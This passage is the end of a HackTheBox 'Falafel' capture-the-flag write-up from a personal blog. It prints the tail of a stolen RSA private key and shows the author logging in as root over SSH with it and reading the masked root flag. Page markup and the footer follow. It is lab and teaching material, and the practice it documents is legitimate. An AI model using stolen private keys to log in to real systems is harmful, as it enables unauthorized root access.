+<span class="go">b+Zd6WPVczObUnC+TaElpDXhf3gjLvjXvn7qGuZekNdB1aoWt5IKT90yz9vUx/gf</span>
+<span class="go">v22+b8XdCdzyXpJW0fAmEN+m5DAETxHDzPdNfpswwYpDX0gqLCZIuMC7Z8D8Wpkg</span>
+<span class="go">BWQ5RfpdFDWvIexRDfwj/Dx+tiIPGcYtkpQ/UihaDgF0gwj912Zc1N5+0sILX/Qd</span>
+<span class="go">UQ+ZywP/qj1FI+ki/kJcYsW/5JZcG20xS0QgNvUBGpr+MGh2urh4angLcqu5b/ZV</span>
+<span class="go">dmoHaOx/UOrNywkp486/SQtn30Er7SlM29/8PQIDAQABAoIBAQCGd5qmw/yIZU/1</span>
+<span class="go">eWSOpj6VHmee5q2tnhuVffmVgS7S/d8UHH3yDLcrseQhmBdGey+qa7fu/ypqCy2n</span>
+<span class="go">gVOCIBNuelQuIAnp+EwI+kuyEnSsRhBC2RANG1ZAHal/rvnxM4OqJ0ChK7TUnBhV</span>
+<span class="go">+7IClDqjCx39chEQUQ3+yoMAM91xVqztgWvl85Hh22IQgFnIu/ghav8Iqps/tuZ0</span>
+<span class="go">/YE1+vOouJPD894UEUH5+Bj+EvBJ8+pyXUCt7FQiidWQbSlfNLUWNdlBpwabk6Td</span>
+<span class="go">OnO+rf/vtYg+RQC+Y7zUpyLONYP+9S6WvJ/lqszXrYKRtlQg+8Pf7yhcOz/n7G08</span>
+<span class="go">kta/3DH1AoGBAO0itIeAiaeXTw5dmdza5xIDsx/c3DU+yi+6hDnV1KMTe3zK/yjG</span>
+<span class="go">UBLnBo6FpAJr0w0XNALbnm2RToX7OfqpVeQsAsHZTSfmo4fbQMY7nWMvSuXZV3lG</span>
+<span class="go">ahkTSKUnpk2/EVRQriFjlXuvBoBh0qLVhZIKqZBaavU6iaplPVz72VvLAoGBANj0</span>
+<span class="go">GcJ34ozu/XuhlXNVlm5ZQqHxHkiZrOU9aM7umQkGeM9vNFOwWYl6l9g4qMq7ArMr</span>
+<span class="go">5SmT+XoWQtK9dSHVNXr4XWRaH6aow/oazY05W/BgXRMxolVSHdNE23xuX9dlwMPB</span>
+<span class="go">f/y3ZeVpbREroPOx9rZpYiE76W1gZ67H6TV0HJcXAoGBAOdgCnd/8lAkcY2ZxIva</span>
+<span class="go">xsUr+PWo4O/O8SY6vdNUkWIAm2e7BdX6EZ0v75TWTp3SKR5HuobjVKSht9VAuGSc</span>
+<span class="go">HuNAEfykkwTQpFTlmEETX9CsD09PjmsVSmZnC2Wh10FaoYT8J7sKWItSzmwrhoM9</span>
+<span class="go">BVPmtWXU4zGdST+KAqKcVYubAoGAHR5GBs/IXFoHM3ywblZiZlUcmFegVOYrSmk/</span>
+<span class="go">k+Z6K7fupwip4UGeAtGtZ5vTK8KFzj5p93ag2T37ogVDn1LaZrLG9h0Sem/UPdEz</span>
+<span class="go">HW1BZbXJSDY1L3ZiAmUPgFfgDSze/mcOIoEK8AuCU/ejFpIgJsNmJEfCQKfbwp2a</span>
+<span class="go">M05uN+kCgYBq8iNfzNHK3qY+iaQNISQ657Qz0sPoMrzQ6gAmTNjNfWpU8tEHqrCP</span>
+<span class="go">NZTQDYCA31J/gKIl2BT8+ywQL50avvbxcXZEsy14ExVnaTpPQ9m2INlxz97YLxjZ</span>
+<span class="go">FEUbkAlzcvN/S3LJiFbnkQ7uJ0nPj4oPw1XBcmsQoBwPFOcCEvHSrg==</span>
+<span class="go">-----END RSA PRIVATE KEY-----</span>
+</pre></div>
+
+
+<p>So now we can put copy this on a file and use it to login:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$</span> ssh -i ssh.key root@10.10.10.73
+<span class="go">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span>
+<span class="go">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span>
+<span class="go">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span>
+<span class="go">Permissions 0644 for &#39;ssh.key&#39; are too open.</span>
+<span class="go">It is required that your private key files are NOT accessible by others.</span>
+<span class="go">This private key will be ignored.</span>
+<span class="go">Load key &quot;ssh.key&quot;: bad permissions</span>
+<span class="go">root@10.10.10.73&#39;s password: </span>
+
+<span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$</span> chmod <span class="m">600</span> ssh.key 
+<span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$</span> ssh -i ssh.key root@10.10.10.73
+<span class="go">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)</span>
+
+<span class="go"> * Documentation:  https://help.ubuntu.com</span>
+<span class="go"> * Management:     https://landscape.canonical.com</span>
+<span class="go"> * Support:        https://ubuntu.com/advantage</span>
+
+<span class="go">0 packages can be updated.</span>
+<span class="go">0 updates are security updates.</span>
+
+
+<span class="go">Last login: Tue May  1 20:14:09 2018 from 10.10.14.4</span>
+<span class="gp">root@falafel:~#</span> ls -l
+<span class="go">total 4</span>
+<span class="go">-r-------- 1 root root 33 Nov 27  2017 root.txt</span>
+<span class="gp">root@falafel:~#</span> cat root.txt 
+<span class="go">23****************************a1</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Falafel.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Falafel"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
